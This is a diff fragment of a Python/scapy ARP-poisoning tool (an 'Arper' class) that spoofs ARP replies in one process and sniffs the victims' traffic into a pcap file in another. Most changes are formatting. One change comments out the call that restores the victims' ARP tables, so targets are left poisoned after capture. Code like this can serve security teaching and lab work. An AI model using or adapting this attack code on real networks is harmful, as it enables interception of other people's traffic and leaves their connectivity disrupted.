@@ -1,10 +1,10 @@
 from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                        send, sniff, sndrcv, srp, wrpcap)
 import os
 import sys
 import time
-import signal
+
 
 def get_mac(targetip):
     packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
@@ -29,11 +29,11 @@ class Arper():
         print('-'*30)
 
     def run(self):
-            self.poison_thread = Process(target=self.poison)
-            self.poison_thread.start()
+        self.poison_thread = Process(target=self.poison)
+        self.poison_thread.start()
 
-            self.sniff_thread = Process(target=self.sniff)
-            self.sniff_thread.start()
+        self.sniff_thread = Process(target=self.sniff)
+        self.sniff_thread.start()
             
     def poison(self):
         poison_victim = ARP()
@@ -78,7 +78,7 @@ class Arper():
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
         wrpcap('arper.pcap', packets)
         print('Got the packets')
-        self.restore()
+        #self.restore()
         self.poison_thread.terminate()
         print('Finished.')
         
